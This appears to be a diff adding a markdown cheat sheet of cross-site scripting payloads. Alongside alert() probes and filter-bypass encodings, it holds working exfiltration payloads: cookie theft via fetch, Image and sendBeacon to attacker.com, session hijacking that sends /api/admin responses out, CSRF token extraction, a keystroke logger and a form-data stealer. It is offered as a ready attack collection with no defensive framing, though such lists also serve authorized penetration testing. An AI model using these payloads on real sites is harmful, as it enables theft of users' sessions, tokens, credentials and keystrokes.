@@ -1,0 +1,73 @@
+# XSS Payloads (Stored + Reflected)
+
+## Basic Alerts
+<script>alert('XSS')</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<marquee onstart=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+
+## Cookie Stealing
+<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>
+<img src=x onerror="fetch('http://attacker.com/log?c='+document.cookie)">
+<script>new Image().src='http://attacker.com/log.gif?'+document.cookie</script>
+<img src=x onerror="navigator.sendBeacon('http://attacker.com/log', document.cookie)">
+
+## Session Hijacking
+<script>fetch('/api/admin', {method: 'GET', credentials: 'include'}).then(r=>fetch('http://attacker.com/log?data='+r.text()))</script>
+
+## CSRF Token Extraction
+<img src=x onerror="fetch('/api/settings').then(r=>r.text()).then(t=>fetch('http://attacker.com/log?token='+t))">
+
+## Keylogger
+<script>
+document.addEventListener('keypress', function(e) {
+  fetch('http://attacker.com/log?key=' + e.key);
+});
+</script>
+
+## Form Hijacking
+<script>
+document.querySelector('form').addEventListener('submit', function(e) {
+  fetch('http://attacker.com/log?data=' + new FormData(this));
+});
+</script>
+
+## Event Handlers
+<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycpOw=='))">
+<div onmouseover="alert('XSS')">Hover</div>
+<input onchange="alert('XSS')" type="text">
+<video onloadstart=alert('XSS')>
+<audio onloadstart=alert('XSS')>
+<iframe onload=alert('XSS')>
+<object onload=alert('XSS')>
+<embed onload=alert('XSS')>
+
+## Encoding Bypasses
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;'&#88;&#83;&#83;'&#41;">
+<img src=x onerror="eval('\x61\x6c\x65\x72\x74\x28\x22\x58\x53\x53\x22\x29')">
+<script>eval(unescape('%61%6c%65%72%74%28%22%58%53%53%22%29'))</script>
+
+## CSS Expression (IE)
+<style>body{background:url('javascript:alert("XSS")')}</style>
+<style>body{expression:alert('XSS')}</style>
+
+## SVG Vectors
+<svg/onload=alert('XSS')>
+<svg><script>alert('XSS')</script></svg>
+<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>
+
+## Data URI
+<iframe src="data:text/html,<script>alert('XSS')</script>">
+<object data="data:text/html,<script>alert('XSS')</script>">
+
+## Mutation XSS
+<form><button formaction="javascript:alert('XSS')">Click</button></form>
+<math><mtext><script>alert('XSS')</script></mtext></math>
+
+## Unicode/UTF-8 Bypasses
+<img src=x onerror="&#97;l&#101;rt('XSS')">
+<img src=x onerror="\u0061\u006c\u0065\u0072\u0074('XSS')">
